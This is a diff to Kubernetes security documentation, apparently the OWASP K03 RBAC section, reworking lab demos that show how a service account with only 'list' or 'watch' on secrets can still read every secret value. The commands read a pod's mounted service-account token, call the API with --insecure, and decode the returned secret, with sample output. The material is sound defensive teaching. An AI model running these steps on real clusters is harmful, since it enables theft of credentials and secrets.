@@ -134,27 +134,52 @@ of that resource
 
 ```bash
 
-# Create example A, which can only list secrets in the default namespace
-# It does not have the GET permission
-kubectl create serviceaccount only-list-secrets-sa
-kubectl create role only-list-secrets-role --verb=list --resource=secrets
-kubectl create rolebinding only-list-secrets-default-ns \
-  --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa
-# Now to impersonate that service account
-kubectl proxy &
-# Create a secret to get
+# tested on minikube version: v1.32.0 (commit: 8220a6eb95f0a4d75f7f2d7b14cef975f050512d)
+
+# export names
+export serviceName=list-sa
+export podName=my-list-pod
+export roleName=role-list-secret
+export roleBindingName=rolebinding-list-secrets-default-ns
+
+# create list-sa service account
+kubectl create serviceaccount $serviceName
+
+# create RBAC rules and binding it
+kubectl create role $roleName --verb=list --resource=secrets
+kubectl create rolebinding $roleBindingName --role=$roleName --serviceaccount=default:$serviceName
+
+# create secret abc
 kubectl create secret generic abc --from-literal=secretAuthToken=verySecure123
-# Prove we cannot get that secret
-curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets/abc \
-  -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-list-secrets-sa")| \
-  .data.token' | tr -d '"' | base64 -d)"
+
+# create pod
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: $podName
+spec:
+  containers:
+    - image: nginx
+      name: nginx
+  serviceAccountName: $serviceName
+  automountServiceAccountToken: true
+EOF
+
+# enter in the pod
+kubectl exec -it $podName bash
+
+# (inside the pod) get sa token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# (inside the pod) Prove we cannot get that secret
+curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/secrets/abc --insecure
 {
   "kind": "Status",
   "apiVersion": "v1",
-  "metadata": {
-  },
+  "metadata": {},
   "status": "Failure",
-  "message": "secrets \"abc\" is forbidden: User \"system:serviceaccount:default:only-list-secrets-sa\" cannot get resource \"secrets\" in API group \"\" in the namespace \"default\"",
+  "message": "secrets \"abc\" is forbidden: User \"system:serviceaccount:default:list-sa\" cannot get resource \"secrets\" in API group \"\" in the namespace \"default\"",
   "reason": "Forbidden",
   "details": {
     "name": "abc",
@@ -162,28 +187,26 @@ curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets/abc \
   },
   "code": 403
 }
-# Now to get all secrets in the default namespace, despite not having "get" permission
-curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets?limit=500 -H \
-  "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-list-secrets-sa")| \
-  .data.token' | tr -d '"' | base64 -d)"
+
+# (inside the pod) Now to get all secrets in the default namespace, despite not having "get" permission
+curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/secrets --insecure
 {
   "kind": "SecretList",
   "apiVersion": "v1",
   "metadata": {
-    "selfLink": "/api/v1/namespaces/default/secrets",
-    "resourceVersion": "17718246"
+    "resourceVersion": "981"
   },
   "items": [
-  REDACTED : REDACTED
+    {
+    REDACTED : REDACTED
   ]
 }
+
 # Cleanup
-kubectl delete serviceaccount only-list-secrets-sa
-kubectl delete role only-list-secrets-role 
-kubectl delete rolebinding only-list-secrets-default-ns 
+kubectl delete serviceaccount $serviceName
+kubectl delete role $roleName 
+kubectl delete rolebinding $roleBindingName --role=$roleName --serviceaccount=default:$serviceName
 kubectl delete secret abc
-# Kill backgrounded kubectl proxy
-kill "%$(jobs | grep "kubectl proxy" | cut -d [ -f 2| cut -d ] -f 1)"
 ```
 
 ### References
@@ -212,94 +235,57 @@ Mitigations](../../../assets/images/K03-2022-mitigation.gif)
 
 ```bash
 
+
+# tested on minikube version: v1.32.0 (commit: 8220a6eb95f0a4d75f7f2d7b14cef975f050512d)
+
+# export names
+export serviceName=watch-sa
+export podName=my-watch-pod
+export roleName=role-watch-secret
+export roleBindingName=rolebinding-watch-secrets-default-ns
+
 # Create example A, which can only watch secrets in the default namespace
 # It does not have the GET permission
-kubectl create serviceaccount only-watch-secrets-sa
-kubectl create role only-watch-secrets-role --verb=watch --resource=secrets
-kubectl create rolebinding only-watch-secrets-default-ns --role=only-watch-secrets-role --serviceaccount=default:only-watch-secrets-sa
-# Now to impersonate that service account
-kubectl proxy &
+kubectl create serviceaccount $serviceName
+kubectl create role $roleName --verb=watch --resource=secrets
+kubectl create rolebinding $roleBindingName --role=$roleName --serviceaccount=default:$serviceName
+
 # Create a secret to get
 kubectl create secret generic  abcd  --from-literal=secretPassword=verySecure
-# Prove we cannot get that secret
-curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets/abcd \
-  -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-watch-secrets-sa")| \
-  .data.token' | tr -d '"' | base64 -d)"
-{
-  "kind": "Status",
-  "apiVersion": "v1",
-  "metadata": {
-  },
-  "status": "Failure",
-  "message": "secrets \"abc\" is forbidden: User \"system:serviceaccount:default:only-watch-secrets-sa\" cannot get resource \"secrets\" in API group \"\" in the namespace \"default\"",
-  "reason": "Forbidden",
-  "details": {
-    "name": "abcd",
-    "kind": "secrets"
-  },
-  "code": 403
-}
 
-# Prove we cannot list the secrets either
-curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets?limit=500 \
-  -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-watch-secrets-sa")| \
-  .data.token' | tr -d '"' | base64 -d)"
-{
-  "kind": "Status",
-  "apiVersion": "v1",
-  "metadata": {
-    
-  },
-  "status": "Failure",
-  "message": "secrets is forbidden: User \"system:serviceaccount:default:only-watch-secrets-sa\" cannot list resource \"secrets\" in API group \"\" in the namespace \"default\"",
-  "reason": "Forbidden",
-  "details": {
-    "kind": "secrets"
-  },
-  "code": 403
-}
+# create pod
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: $podName
+spec:
+  containers:
+    - image: nginx
+      name: nginx
+  serviceAccountName: $serviceName
+  automountServiceAccountToken: true
+EOF
 
+
+# enter in the pod
+kubectl exec -it $podName bash
+
+# (inside the pod) get sa token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# (inside the pod) try to retrieve the secret
+# !! Failure !!
+curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/secrets/abcd --insecure
+
+# !! Failure !!
+curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/secrets --insecure
+  
+  
 # Now to get all secrets in the default namespace, despite not having "get" permission
-curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets?watch=true \
-  -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-watch-secrets-sa")| \
-  .data.token' | tr -d '"' | base64 -d)"
+curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/secrets?watch=true --insecure
+{"type":"ADDED","object":{"kind":"Secret","apiVersion":"v1","metadata":{"name":"abcd","namespace":"default","uid":"bd1b0f74-ce54-47c4-a1dc-91893848e4ed","resourceVersion":"477","creationTimestamp":"2023-12-18T13:30:41Z","managedFields":[{"manager":"kubectl-create","operation":"Update","apiVersion":"v1","time":"2023-12-18T13:30:41Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:secretPassword":{}},"f:type":{}}}]},"data":{"secretPassword":"dmVyeVNlY3VyZQ=="},"type":"Opaque"}}"
 
-{
-  "type": "ADDED",
-  "object": {
-    "kind": "Secret",
-    "apiVersion": "v1",
-    "metadata": {
-      "name": "abcd",
-      "namespace": "default",
-      "selfLink": "/api/v1/namespaces/default/secrets/abcd",
-      "uid": "725c84ee-8dc7-41ef-a03e-193225e228b2",
-      "resourceVersion": "1903164",
-      "creationTimestamp": "2022-09-09T13:39:43Z",
-      "managedFields": [
-        {
-          "manager": "kubectl-create",
-          "operation": "Update",
-          "apiVersion": "v1",
-          "time": "2022-09-09T13:39:43Z",
-          "fieldsType": "FieldsV1",
-          "fieldsV1": {
-            "f:data": {
-              ".": {},
-              "f:secretPassword": {}
-            },
-            "f:type": {}
-          }
-        }
-      ]
-    },
-    "data": {
-      "secretPassword": "dmVyeVNlY3VyZQ=="
-    },
-    "type": "Opaque"
-  }
-}
-REDACTED OTHER SECRETS
 # crtl+c to stop curl as this http request will continue
 
 # Proving that we got the full secret
@@ -307,12 +293,11 @@ echo "dmVyeVNlY3VyZQ==" | base64 -d
 verySecure
 
 # Cleanup
-kubectl delete serviceaccount only-watch-secrets-sa
-kubectl delete role only-watch-secrets-role 
-kubectl delete rolebinding only-watch-secrets-default-ns --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa
+kubectl delete serviceaccount $serviceName
+kubectl delete role $roleName 
+kubectl delete rolebinding $roleBindingName --role=$roleName --serviceaccount=default:$serviceName
 kubectl delete secret abcd
-# Kill backgrounded kubectl proxy
-kill "%$(jobs | grep "kubectl proxy" | cut -d [ -f 2| cut -d ] -f 1)"
+
 ```
 
 ### References
